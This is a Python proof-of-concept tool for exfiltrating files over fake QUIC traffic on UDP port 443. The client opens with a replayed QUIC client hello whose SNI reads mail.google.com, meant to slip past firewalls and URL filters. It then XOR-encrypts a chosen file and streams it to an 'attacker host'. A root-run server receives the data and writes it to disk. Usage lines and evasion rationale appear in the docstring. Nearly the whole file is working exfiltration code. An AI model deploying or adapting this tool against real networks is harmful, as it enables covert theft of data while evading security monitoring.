import socket
import base64
import sys
import time
import optparse
from itertools import cycle, izip

'''
    POC for data exfiltration using QUIC. https://attack.mitre.org/wiki/Technique/T1048
    Why use QUIC for exfiltration? Most (if not all) IPS/NG firewallas/Secure Web Gateways are ignoring QUIC. It is 
    not inspected and furthermore not monitored or blocked. 
    
    The POC code starts by sending a real QUIC client hello and follows it by a stream of encrypted exfiltrated data. 
     
    Preconditions: Any OS running python. Server side must be executed as root (listenes on port < 1024) 
    
    Postconditions: file is transfered to the attacker
    
    Known issues: There is no data integrity validation since it is UDP and not a full QUIC implementation 
    
    Usage:
        Start server:
        sudo python quic_exfiltrate.py --server --encrypt johnny
        
        Send data:
        python quic_exfiltrate.py --host 127.0.0.1 --filename r.txt --encrypt johnny
    
    
    
'''


bogus_quic =    (
                        "0db2de5df14f5545eb51303234013b6e8986f83cf3b7a6ab5d0501a001000443484c4f180000005041440087010000534e49"+
                        "009601000053544b00d001000056455200d401000043435300e40100004e4f4e43040200004d53504308020000414541440c"+
                        "02000055414944240200005343494434020000544349443802000050444d443c02000053524246400200004943534c440200"+
                        "00505542536402000053434c53680200004b4558536c020000434f50546c0200004343525484020000434753548802000049"+
                        "5254548c0200004345545630030000434643573403000053464357380300002d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d"+
                        "2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d"+
                        "2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d"+
                        "2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d"+
                        "2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d"+
                        "2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d"+
                        "2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d"+
                        "2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d"+
                        "2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d6d61696c2e676f6f676c652e636f6d3d3ebfa7b081c46fae50c59782"+
                        "2008a06d2d25d5c3bde492f6d20e6bdc98e7f64c1331ba5beb1b3f3219315d1798cb3447ebc5d0d8953e3ac1585130323439"+
                        "9ff95340f7fec97b26e9e7e45c71ff554db350b5902b71af4095f543c82cda09eb0da178d3aed131d79999dba978df640000"+
                        "004145534762657461204368726f6d652f34332e302e323335372e343592805b8a4bd6ee4ade261cdcc5e545bc0000000058"+
                        "353039000004001e000000b522ba0c12e577ba955efedf94ab0e3850362d970cf30cfd201aebbe39abad3101000000433235"+
                        "35b2ca6412d9a4f3c31247fd4d4291e508400b7b90a9ae79eb514249433860010025e68382969dad1307a79de61db488b540"+
                        "d734ded051833a9b7314a688955c2ff4ae8b37bb8c740e33c15648075881c979262033de6808d1f0a0c78845e22cc7658a59"+
                        "cd2315ebb1fdfafa74a6032c03f7d30c89ae504a88c360f427931fe4a5cdbe5a480bb930fbc7a26e80a9ed549d0e7200516b"+
                        "765b79a5736c8cd74fd0eeb6c2b4cdd9854e54fb3f317fd58d0aba961ff6e93892a9e51af40ba14bb2c8a6c5a2fbba0000a0"+
                        "000000a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                        "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                        "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                        "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                        "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                        "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                        "0db2de5df14f5545eb51303234029dc6e403de096348b85050e7cb45b5073611b285503d6f6bb8c35456f44e120990a9c9c3"+
                        "0965c710088c204dfca027feaefcec725c743cb7d1ac21456918de41484cff11aa29223cc6d287b2f89d7876155a413e5c95"+
                        "9e215f66a530a527282a57d941e9f24e2020113e0536836e1c78b1596d6776116c5775b25541730c420838acf611a85d6ca1"+
                        "71453d4e9482bcf5eac83201606b30f211943718ef59c0b7e9d2e228f950d40fbe5479648f31b11ac7e022b8a3d79b743ba9"+
                        "605f155b03f1e95b71b679b026b0aada28202792452d265dc0388fc9d8e9633ce27cc9bb1bf2286ad0d4f9cadec8ea3c3ad1"+
                        "acf9091e905789594bfb7e7d0b0a78a1f432b110847ddbe9ff81654288f6e8a4491e217d0c40f3161e30c15c9ff7e349c8cf"+
                        "4da52a3e842a8072893cc64068968e21747fd3ab79fe658defdc00439b887e3fec4af9c5daf03e5a0f82b7eeeeda230aff58"+
                        "4e018d3f10ed29867b9662e867c4deeb9a38d888a2a9ce36fe5989f3087a1c81b4baab8bbc5667213fca9dd849a6b3b0a44a"+
                        "dcd857f0805192849df4af6a353f45a55f8e1cfd82236b5b70ebe41d4cbbbcc8c0c14112"
                        ).decode('hex')

class QuickerServer(object):
    def __init__(self,enc_key=False):
        self.enc_key = enc_key
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        self.sock.bind(('0.0.0.0', 443))
        self.recieve()

    def recieve(self):
        buff = ''
        while True:
            data, addr = self.sock.recvfrom(1024)
            buff += data
            if buff.find(bogus_quic,1)>-1:
                break
        data = buff[len(bogus_quic):-len(bogus_quic)]

        with open('exf_%d' % time.time(),'w') as f:
            if self.enc_key is not False:
                data = self.decrypt(data)
            f.write(data)


    def decrypt(self,buff):
        return ''.join(chr(ord(c) ^ ord(k)) for c, k in izip(buff, cycle(self.enc_key)))



class Quicker(object):
    def __init__(self, host, port,enc_key=False):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.connect((self.host, self.port))
        self.enc_key = enc_key
        self.mtu = 459
        self.__init_fake_quic()


    def __init_fake_quic(self):
        ''' real quic client hello to mail.google.com (this could trick any url filtering solution if it parses the SNI
        field'''
        self.send_buffer(bogus_quic)

    def send_buffer(self, buff):
        for i in range(0, len(buff), self.mtu):
            self.sock.send(buff[i:i + self.mtu])

    def encrypt(self, buff):
        return ''.join(chr(ord(c) ^ ord(k)) for c, k in izip(buff, cycle(self.enc_key)))


    def send_file(self,fname):
        try:
            with open(fname) as f:
                buff = f.read()
                if self.enc_key is not False:
                    buff = self.encrypt(buff)
                self.send_buffer(buff)
            self.send_buffer(bogus_quic) # marks end of transfer
        except:
            pass

def get_options():
    parser = optparse.OptionParser( description='Utility to send files over QUIC' )
    parser.add_option('--host', action="store", help="Attacker host")
    parser.add_option('--filename', action="store", help="Exfiltrated file")
    parser.add_option('--server', action="store_true", help="Activate server", default = False)
    parser.add_option('--encrypt', action="store", help="Encrypt data",default=False)
    args, _ = parser.parse_args()

    return args, _

if __name__ == "__main__":
    args, _ = get_options()
    if args.server:
        QuickerServer(enc_key=args.encrypt)
    else:
        a=Quicker(args.host,443,enc_key=args.encrypt)
        a.send_file(args.filename)

